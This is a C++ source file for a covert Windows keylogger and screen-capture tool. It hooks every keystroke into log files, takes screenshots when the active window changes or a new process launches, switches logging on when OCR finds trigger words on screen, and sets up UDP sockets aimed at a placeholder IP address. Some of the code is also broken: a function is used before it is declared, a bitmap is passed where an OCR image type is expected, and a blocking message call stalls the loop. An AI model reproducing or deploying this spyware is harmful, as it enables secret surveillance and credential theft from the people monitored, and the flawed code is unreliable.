#include <iostream>
#include <windows.h>
#include <winsock2.h>
#include <string>
#include <tesseract/baseapi.h>
#include <leptonica/allheaders.h>
#include <tlhelp32.h>  // For process enumeration
#include <set>
#include <direct.h>  // For _mkdir
#include <ctime>     // For current time and date
#include <gdiplus.h> // For image handling
#include <fstream>   // For file handling

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

// Global variables
HHOOK hook;
SOCKET SendSocket, RecvSocket;
sockaddr_in dest, server, client;
KBDLLHOOKSTRUCT kbStruct;
bool keyloggerActive = false;
HWND prevWindow = NULL;  // To store the handle of the previous window
std::set<DWORD> existingProcesses;  // To store the PIDs of currently running processes
std::string baseFolder; // Base folder to store both keylogs and screencaptures

// Function to get the current date and time as a string
std::string GetCurrentDateTime() {
    time_t now = time(0);
    tm* ltm = localtime(&now);

    char dateTimeStr[100];
    sprintf(dateTimeStr, "%04d-%02d-%02d_%02d-%02d-%02d",
        1900 + ltm->tm_year,
        1 + ltm->tm_mon,
        ltm->tm_mday,
        ltm->tm_hour,
        ltm->tm_min,
        ltm->tm_sec);

    return std::string(dateTimeStr);
}

// Function to create folder if it doesn't already exist
void CreateFolderIfNotExists(const std::string& path) {
    DWORD fileAttributes = GetFileAttributes(path.c_str());
    if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
        // Folder does not exist, create it
        _mkdir(path.c_str());
        std::cout << "Created folder: " << path << std::endl;
    }
    else {
        std::cout << "Folder already exists: " << path << std::endl;
    }
}

// Function to create both keylogs and screencaptures directories
void SetupDirectories() {
    baseFolder = "C:\\path_to_save\\" + GetComputerName();  // Replace with your desired path
    CreateFolderIfNotExists(baseFolder);
    CreateFolderIfNotExists(baseFolder + "\\keylogs");
    CreateFolderIfNotExists(baseFolder + "\\screencaptures");
}

// Function to get the computer name
std::string GetComputerName() {
    CHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameA(computerName, &size)) {
        return std::string(computerName);
    }
    return "UnknownComputer";
}

// Function to save the captured screen image
void SaveScreenCapture(Gdiplus::Bitmap* bitmap) {
    std::string folder = baseFolder + "\\screencaptures";
    std::string fileName = folder + "\\" + GetCurrentDateTime() + ".png";

    CLSID clsid;
    CLSIDFromString(L"{557CF400-1A04-11D3-9A26-00C04F79FAA6}", &clsid); // CLSID for PNG

    std::wstring wFileName(fileName.begin(), fileName.end());
    bitmap->Save(wFileName.c_str(), &clsid, NULL);
}

// Function to capture the screen and return it as a Gdiplus::Bitmap object
Gdiplus::Bitmap* CaptureScreen() {
    using namespace Gdiplus;

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    // Get screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    // Create a Bitmap from the HBITMAP
    Bitmap* bitmap = Bitmap::FromHBITMAP(hBitmap, NULL);

    // Clean up
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return bitmap;
}

// Function to create a new file for keylogs
std::ofstream CreateLogFile() {
    std::string folder = baseFolder + "\\keylogs";
    std::string fileName = folder + "\\" + GetCurrentDateTime() + ".txt";
    std::ofstream logFile(fileName);

    if (logFile.is_open()) {
        std::cout << "Created log file: " << fileName << std::endl;
    }
    else {
        std::cerr << "Failed to create log file." << std::endl;
    }

    return logFile;
}

// Function to check if specific words are on screen
bool CheckForKeywordsOnScreen() {
    tesseract::TessBaseAPI tess;
    if (tess.Init(NULL, "eng")) {
        std::cerr << "Could not initialize tesseract.\n";
        return false;
    }

    Pix* image = CaptureScreen();
    tess.SetImage(image);

    // Perform OCR and get the extracted text
    std::string extractedText = tess.GetUTF8Text();
    pixDestroy(&image);

    // Keywords to check
    std::string keywords[] = { "START", "KEYLOGGER", "ACTIVATE" };

    // Check if any keyword is in the extracted text
    for (const std::string& keyword : keywords) {
        if (extractedText.find(keyword) != std::string::npos) {
            return true;  // Keyword found, start the keylogger
        }
    }

    return false;
}

// Function to capture the active window when it changes
void CaptureOnWindowChange() {
    HWND currentWindow = GetForegroundWindow();  // Get the handle of the current active window
    if (currentWindow != prevWindow) {
        // A new window has been activated
        prevWindow = currentWindow;

        // Trigger screen capture
        Gdiplus::Bitmap* bitmap = CaptureScreen();
        std::cout << "New window detected, captured screen." << std::endl;

        // Save the image
        SaveScreenCapture(bitmap);
        delete bitmap;
    }
}

// Function to detect new processes and capture screen if a new process starts
void DetectNewProcesses() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // If the snapshot is valid, start iterating over the processes
    if (Process32First(hSnapshot, &processEntry)) {
        do {
            // Check if the process is new
            if (existingProcesses.find(processEntry.th32ProcessID) == existingProcesses.end()) {
                // New process detected
                existingProcesses.insert(processEntry.th32ProcessID);

                std::cout << "New process detected: " << processEntry.szExeFile << std::endl;

                // Trigger screen capture when a new process is detected
                Gdiplus::Bitmap* bitmap = CaptureScreen();
                SaveScreenCapture(bitmap);
                delete bitmap;
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }

    CloseHandle(hSnapshot);
}

// Callback function for the keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && keyloggerActive) {
        if (wParam == WM_KEYDOWN) {
            kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
            char message[10];
            sprintf(message, "%d", kbStruct.vkCode); // Convert keycode to string

            static std::ofstream logFile = CreateLogFile(); // Open log file

            if (logFile.is_open()) {
                logFile << message << std::endl;
            }
        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Setup directories
    SetupDirectories();

    // Create and bind the UDP socket for receiving data
    RecvSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(27015); // Port number
    bind(RecvSocket, (SOCKADDR*)&server, sizeof(server));

    // Create and set up the UDP socket for sending data
    SendSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    dest.sin_family = AF_INET;
    dest.sin_port = htons(27015); // Port number
    dest.sin_addr.s_addr = inet_addr("YOUR_IP_ADDRESS"); // Replace with your IP address

    // Hook for keyboard logging
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return 1;
    }

    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Populate the existing process set at startup
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &processEntry)) {
        do {
            existingProcesses.insert(processEntry.th32ProcessID);
        } while (Process32Next(hSnapshot, &processEntry));
    }
    CloseHandle(hSnapshot);

    std::cout << "Listening for data..." << std::endl;
    while (true) {
        // Check for new processes and window changes
        CaptureOnWindowChange();
        DetectNewProcesses();

        // Process incoming data from UDP socket
        char buffer[512];
        int clientLen = sizeof(client);
        int recvLen = recvfrom(RecvSocket, buffer, sizeof(buffer) - 1, 0, (SOCKADDR*)&client, &clientLen);
        if (recvLen > 0) {
            buffer[recvLen] = '\0'; // Null-terminate the received data
            std::cout << "Received: " << buffer << std::endl;
        }

        // Check if keywords are present on the screen
        if (!keyloggerActive) {
            keyloggerActive = CheckForKeywordsOnScreen();  // Activate if keywords are detected
        }

        // Process Windows messages to keep the hook active
        MSG msg;
        if (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        Sleep(1000);  // Adjust sleep time based on how often you want to check for changes
    }

    UnhookWindowsHookEx(hook);
    closesocket(SendSocket);
    closesocket(RecvSocket);
    WSACleanup();
    Gdiplus::GdiplusShutdown(gdiplusToken);

    return 0;
}
